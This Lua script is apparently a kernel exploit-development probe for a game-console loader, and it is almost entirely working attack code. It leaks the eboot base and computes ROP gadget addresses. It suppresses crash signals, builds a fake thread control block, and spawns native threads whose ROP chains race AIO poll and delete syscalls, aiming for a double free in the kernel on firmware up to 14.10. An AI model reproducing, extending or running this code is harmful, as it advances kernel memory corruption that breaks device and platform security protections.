-- CRASH_CLASS: HIGH
-- PROBE 523a: AIO delete race with native child threads
--
-- Context: the 14.20 fix text describes the aio_multi_delete TOCTOU: the
-- delete drops the table lock, re-acquires the object, and only then frees
-- the request's sub-objects. A racing thread can free and reallocate that
-- slot in the window, so <=14.10 frees the sub-objects of a swapped object.
-- 13.60 disassembly (docs/AIO_RANGE_14_10_EVIDENCE.md):
--   0x3afc67 unlock -> 0x3afd0c read [obj+0x28] unlocked
--   -> 0x3afe63 second unlock -> 0x3afe6c second lookup -> 0x3afeb7 free C
-- Earlier attempts used the loader's Lua threads, which corrupt the Lua VM
-- (509b) before any overlap. This probe uses thr_new(455) children whose ROP
-- chains call the loader stub directly (385a pattern), with a fake TCB so a
-- failing syscall does not fault.
--
-- Each child does 664(ids,1,out) then 662(ids,1,status); three children race
-- to delete the same freshly polled id. A double status of 0 on more than one
-- child, or any status outside {0, 0x80020003, 0x80020010}, is the overlap.

print("=== PROBE 523a: AIO DELETE RACE (NATIVE THREADS) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- [A] eboot + gadgets
print("[A] eboot + gadgets")
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("    eboot=" .. fmt(eb))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42

-- Ignore SIGSEGV/SIGSYS so a child fault does not take the process down
local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

-- Fake TCB (sysarch SET_FSBASE=129 as the first ROP op)
local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
print("[A] fake TCB ready")

if not alive() then print("DEAD after setup"); return end

local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

-- Child: poll then delete one id, writing the delete status to its own cell
local function make_delete_child(ids_addr, poll_out, status_out)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local ss = 0x2000
    local raw_top = sb + ss
    local rsp = raw_top - (raw_top % 16) - 8

    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end

    emit_sysarch_preamble(emit)

    -- 664(ids, 1, poll_out)
    emit(g_pop_rdi); emit(uint64(ids_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(poll_out))
    emit(g_pop_rax); emit(uint64(664))
    emit(stub)

    -- 662(ids, 1, status_out)
    emit(g_pop_rdi); emit(uint64(ids_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(status_out))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)

    -- exit(0) via syscall 431
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    local pa = N(par)
    for i = 0, 0x3C, 4 do wd(pa + i, 0) end
    wq(pa + 0x00, g_bare_ret)
    wq(pa + 0x08, uint64(0))
    wq(pa + 0x10, uint64(sb))
    wq(pa + 0x18, uint64(ss))
    local tid_ptr = memory.alloc(8)
    wq(N(tid_ptr), uint64(0))
    wq(pa + 0x30, tid_ptr)

    return par, tid_ptr
end

-- [B] aio create/poll/delete wrappers
local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_delete = mk(662)
local sc_thr_new = mk(455)

local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local poll_out = memory.alloc(0x40)

local function create_one()
    for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
    wq(N(out_id), uint64(0))
    local ok, rv = pcall(function()
        return sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id)))
    end)
    if not ok then return nil end
    if N(rv) ~= 0 then return nil end
    local h, l = get_hi_lo(rq(N(out_id)))
    if h ~= 0 then return nil end
    return l
end

local id = create_one()
if id == nil then
    print("[B] create failed; aborting")
    return
end
print("[B] create/poll/delete shape ok, sample id=" .. id)

-- [C] race loop
local ITER = 300
local CHILDREN = 3
print("")
print(string.format("[C] %d iterations x %d children", ITER, CHILDREN))

local double_zero = 0
local other_status = 0
local dead_at = 0
local samples = {}

for iter = 1, ITER do
    if not alive() then dead_at = iter; break end

    local the_id = create_one()
    if the_id == nil then
        print("    create failed at iter " .. iter)
        break
    end

    local ids_cell = memory.alloc(16)
    wd(N(ids_cell), the_id)
    wd(N(ids_cell) + 4, 0)

    local kids = {}
    for c = 1, CHILDREN do
        local status = memory.alloc(16)
        local pout = memory.alloc(16)
        wd(N(status), 0xCCCCCCCC)
        wd(N(pout), 0xCCCCCCCC)
        local par = make_delete_child(N(ids_cell), N(pout), N(status))
        pcall(function() sc_thr_new(par, uint64(0x38)) end)
        kids[c] = status
    end

    -- wait for all children to write their status
    local spins = 0
    while spins < 20000 do
        local done = 0
        for c = 1, CHILDREN do
            local v = rd(N(kids[c]))
            if v ~= nil and v ~= -858993460 then done = done + 1 end
        end
        if done == CHILDREN then break end
        spins = spins + 1
    end

    local zeros = 0
    local line = {}
    for c = 1, CHILDREN do
        local v = rd(N(kids[c]))
        line[#line + 1] = string.format("%08X", v or 0)
        if v == 0 then zeros = zeros + 1 end
        if v ~= nil and v ~= 0 and v ~= -2147352576 and v ~= 0x80020003 and v ~= 0x80020010 then
            other_status = other_status + 1
        end
    end
    if zeros >= 2 then
        double_zero = double_zero + 1
        if #samples < 5 then
            samples[#samples + 1] = string.format("iter %d id=%d: %s", iter, the_id, table.concat(line, " "))
        end
    end

    if iter % 25 == 0 then
        print(string.format("    iter %d: last=%s zeros=%d double=%d other=%d",
            iter, table.concat(line, " "), zeros, double_zero, other_status))
    end
end

print("")
print("[D] RESULT")
print(string.format("    iterations=%d dead_at=%s", ITER, tostring(dead_at)))
print(string.format("    iterations with >=2 zero statuses: %d", double_zero))
print(string.format("    unexpected status values: %d", other_status))
for i = 1, #samples do print("    " .. samples[i]) end

-- [E] health check on fresh objects
if alive() then
    local okc, bad, clean = 0, 0, 0
    for i = 1, 8 do
        local x = create_one()
        if x == nil then
            bad = bad + 1
        else
            local cell = memory.alloc(16)
            wd(N(cell), x)
            wd(N(poll_out), 0xCCCCCCCC)
            local pok = pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
            local st = memory.alloc(16)
            wd(N(st), 0xCCCCCCCC)
            local dok = pcall(function() sc_delete(uint64(N(cell)), uint64(1), uint64(N(st))) end)
            if pok and dok and rd(N(st)) == 0 then clean = clean + 1 end
            okc = okc + 1
        end
    end
    print(string.format("[E] fresh create after storm: created=%d failed=%d clean-deletes=%d", okc, bad, clean))
end

print("")
print("=== PROBE 523a COMPLETE ===")
